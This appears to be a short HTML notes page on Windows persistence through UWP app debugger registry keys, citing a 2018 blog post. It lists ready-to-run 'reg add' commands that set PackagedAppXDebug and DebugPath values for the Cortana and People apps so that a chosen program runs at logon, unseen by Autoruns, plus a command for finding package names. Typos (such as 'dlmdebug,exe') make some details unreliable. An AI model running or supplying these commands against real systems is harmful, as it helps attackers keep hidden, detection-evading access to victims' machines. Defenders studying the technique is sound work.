<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>General Primer</title>
</head><body>https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/<br/>
https://www.reddit.com/r/netsec/comments/9dsd8r/new_persistence_technique_using_appx_debugger_not/<br/>
<br/>
Persistence using universal windows platform apps (Appx)<br/>
Persistence can be achieved with Appx/UWP apps using the debugger optinos. Tthis technique will not be visible by Autoruns. Two different approaches exist (registry keys).<br/>
<br/>
Cortana app:<br/>
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\Microsoft.Windows.Cortana_1.10.7.17134_neutral_neutral_cw5n1h2txyewy /d "C:\windows\system32\cmd.exe" OR reg add HKCU\Software\Classes\ActivatableClasses\Package\Microsoft.Windows.Cortana_1.10.7.17134_neutral_neutral_cw5n1h2txyewy\DebugInformation\CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca /v DebugPath /d "C:\windows\system32\cmd.exe" &nbsp;<br/>
<br/>
<br/>
People app:<br/>
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\Microsoft.People_10.1807.2131.0_x64__8wekyb3d8bbwe /d "C:\windows\system32\cmd.exe" OR reg add HKCU\Software\Classes\ActivatableClasses\Package\Microsoft.People_10.1807.2131.0_x64__8wekyb3d8bbwe\DebugInformation\x4c7a3b7dy2188y46d4ya362y19ac5a5805e5x.AppX368sbpk1kx658x0p332evjk2v0y02kxp.mca /v DebugPath /d "C:\windows\system32\cmd.exe" &nbsp;<br/>
<br/>
<br/>
These PoC payloads will exec cmd.exe at logon (since Cortana and People will start at logon). This is also dependant on app versions since they are crucial to the registry key location.<br/>
<br/>
<br/>
Description:<br/>
Many new apps are being started at logon. <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/plmdebug">PLMDebug.exe</a>&nbsp;should be looked at. Its documentation states it can also launch with command line arguments. <br/>
<br/>
Need to find the full name of the package/version: <br/>
Get-AppxPackage | gl name,packagefullname<br/>
<br/>
Passing the PackageFullName to dlmdebug,exe followed by a command will execute both apps.<br/>
<br/>
</body></html>